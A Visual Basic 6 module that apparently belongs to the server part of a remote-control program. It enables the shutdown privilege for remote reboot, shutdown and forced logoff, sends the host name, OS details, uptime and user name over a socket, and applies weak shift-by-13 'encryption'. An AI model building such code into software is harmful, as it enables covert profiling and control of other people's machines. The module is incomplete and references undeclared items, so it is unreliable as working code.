Attribute VB_Name = "modFunctions"
Dim Uzr As String
Dim Nm As String
Dim PF As String
Dim Ver As String
Dim Bld As String
Dim TM As String
Public Declare Function GetTickCount Lib "kernel32" () As Long
Private Type LUID
    UsedPart As Long
    IgnoredForNowHigh32BitPart As Long
End Type
Private Type TOKEN_PRIVILEGES
    PrivilegeCount As Long
    TheLuid As LUID
    Attributes As Long
End Type
Private Const EWX_SHUTDOWN As Long = 1
Private Const EWX_FORCE As Long = 4
Private Const EWX_REBOOT = 2
Private Declare Function ExitWindowsEx Lib "USER32" (ByVal _
    dwOptions As Long, ByVal dwReserved As Long) As Long
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function OpenProcessToken Lib "advapi32" (ByVal _
    ProcessHandle As Long, _
    ByVal DesiredAccess As Long, TokenHandle As Long) As Long
Private Declare Function LookupPrivilegeValue Lib "advapi32" _
    Alias "LookupPrivilegeValueA" _
    (ByVal lpSystemName As String, ByVal lpName As String, lpLuid _
    As LUID) As Long
Private Declare Function AdjustTokenPrivileges Lib "advapi32" _
    (ByVal TokenHandle As Long, _
    ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES _
    , ByVal BufferLength As Long, _
    PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long
' ***** THIS IS TO MAKE MY FORMS STAY ON TOP *****
#If Win32 Then
    Public Const HWND_TOPMOST& = -1
#Else
    Public Const HWND_TOPMOST& = -1
#End If 'WIN32
#If Win32 Then
     Const SWP_NOMOVE& = &H2
    Const SWP_NOSIZE& = &H1
#Else
    Const SWP_NOMOVE& = &H2
     Const SWP_NOSIZE& = &H1
#End If 'WIN32
#If Win32 Then
    Declare Function SetWindowPos& Lib "USER32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long)
#Else
    Declare Sub SetWindowPos Lib "User" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal X As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer)
#End If

Private Sub AdjustToken()
Const TOKEN_ADJUST_PRIVILEGES = &H20
Const TOKEN_QUERY = &H8
Const SE_PRIVILEGE_ENABLED = &H2
Dim hdlProcessHandle As Long
Dim hdlTokenHandle As Long
Dim tmpLuid As LUID
Dim tkp As TOKEN_PRIVILEGES
Dim tkpNewButIgnored As TOKEN_PRIVILEGES
Dim lBufferNeeded As Long
hdlProcessHandle = GetCurrentProcess()
OpenProcessToken hdlProcessHandle, (TOKEN_ADJUST_PRIVILEGES Or _
TOKEN_QUERY), hdlTokenHandle
' Get the LUID for shutdown privilege.
LookupPrivilegeValue "", "SeShutdownPrivilege", tmpLuid
tkp.PrivilegeCount = 1    ' One privilege to set
tkp.TheLuid = tmpLuid
tkp.Attributes = SE_PRIVILEGE_ENABLED
' Enable the shutdown privilege in the access token of this process.
AdjustTokenPrivileges hdlTokenHandle, False, _
    tkp, Len(tkpNewButIgnored), tkpNewButIgnored, lBufferNeeded
End Sub
Public Sub ReBooT()
AdjustToken
ExitWindowsEx (EWX_REBOOT), &HFFFF
End Sub
Public Sub ShutDown()
AdjustToken
ExitWindowsEx (EWX_SHUTDOWN), &HFFFF
End Sub
Public Sub LogOff()
ExitWindowsEx EWX_FORCE Or EWX_LOGOFF, 0&
End Sub
Sub Pause(HowLong As Long)
Dim u%, tick As Long
tick = GetTickCount()
Do
    u% = DoEvents
Loop Until tick + HowLong < GetTickCount
End Sub
Public Function SendTheInformation()
Select Case frmServer.SysInfo.OSPlatform
    Case 0
        PF = "Unknown 32-Bit Windows"
    Case 1
        PF = "Windows 95"
    Case 2
        PF = "Windows NT"
End Select
Ver = frmServer.SysInfo.OSVersion
Bld = frmServer.SysInfo.OSBuild
Nm = frmServer.W1.LocalHostName
TM = GetTickCount
TM = ((TM / 1000) / 60) / 60
Uzr = (Environ("USERNAME"))
Dim MSGS As String
MSGS = "|INFO|" & "1:" & Nm & "2:" & PF & "3:" & Ver & "4:" & Bld & "5:" & TM & "6:" & Uzr
frmServer.W1.SendData MSGS
End Function
Public Function RefreshProcesses()
frmServer.sckProcesses.Close
frmServer.sckProcesses.Listen
End Function
Public Function CheckConnection() As Boolean
Dim Result As Boolean
    Result = InternetGetConnectedState(0&, 0&)  ' Simply test for an internet socket.
    If Result = False Then
        CheckConnection = False
    Else
        CheckConnection = True
    End If
End Function
Public Function ENCRYPT(sString As String, lLEn As Long) As String
Dim i As Long
Dim NewChar As Long
i = 1
Do Until i = lLEn + 1
    NewChar = Asc(Mid(sString, i, 1)) + 13
    ENCRYPT = ENCRYPT + Chr(NewChar)
    i = i + 1
Loop
End Function
Public Function DECRYPT(sString As String, lLEn As Long) As String
Dim i As Long
Dim NewChar As Long
i = 1
Do Until i = lLEn + 1
    NewChar = Asc(Mid(sString, i, 1)) - 13
    DECRYPT = DECRYPT + Chr(NewChar)
    i = i + 1
Loop
End Function
